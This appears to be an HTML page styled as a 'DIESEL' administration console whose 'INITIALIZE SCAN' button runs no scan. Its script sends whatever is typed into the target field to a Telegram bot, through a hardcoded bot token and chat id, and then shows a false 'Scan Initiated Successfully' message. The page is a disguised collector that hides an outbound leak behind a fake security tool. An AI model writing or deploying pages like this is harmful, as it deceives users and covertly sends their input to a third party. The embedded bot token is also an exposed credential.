<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DIESEL | ADMINISTRATION</title>
    <style>
        body { background: #0a0e14; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 250px; background: #161b22; padding: 20px; border-right: 1px solid #30363d; }
        .main { flex: 1; padding: 40px; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        h1 { color: #58a6ff; }
        .status-box { background: #1a2327; border: 1px solid #238636; padding: 15px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; }
        button { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; }
        input { background: #0d1117; border: 1px solid #30363d; padding: 10px; width: 300px; color: white; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>DIESEL</h2>
        <p>DASHBOARD</p>
        <p>REAL-TIME METRICS</p>
        <p>SECURITY PROTOCOLS</p>
    </div>
    <div class="main">
        <h1>DIESEL ADMINISTRATION CONSOLE</h1>
        <div class="status-box">
            <span>SYSTEM STATUS: 100% OPERATIONAL - SECURE</span>
            <button>GENERATE REPORT</button>
        </div>
        <br>
        <div class="card">
            <h3>PLATFORM TRAFFIC & SECURITY</h3>
            <input type="text" id="target" placeholder="Enter target system...">
            <button onclick="execute()">INITIALIZE SCAN</button>
        </div>
    </div>

    <script>
        function execute() {
            const target = document.getElementById('target').value;
            const token = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
            const chat_id = '5177962707';
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chat_id, text: `🚨 Diesel Console Hit: ${target}`})
            }).then(() => alert("Scan Initiated Successfully."));
        }
    </script>
</body>
</html>
